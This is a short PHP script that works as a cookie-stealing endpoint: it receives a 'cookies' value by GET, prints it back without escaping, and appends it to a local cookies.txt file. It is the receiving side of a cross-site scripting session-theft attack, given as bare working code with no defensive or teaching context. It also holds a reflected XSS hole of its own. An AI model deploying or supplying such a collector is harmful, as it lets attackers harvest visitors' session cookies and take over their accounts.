<?php
	if(!empty($_GET)){
		echo "Your cookies are: <br />";
		echo $_GET['cookies'];
		$fp = fopen('./cookies.txt', 'a');
        fwrite($fp, "{$_GET['cookies']}\n");
        fclose($fp);
	}
?>
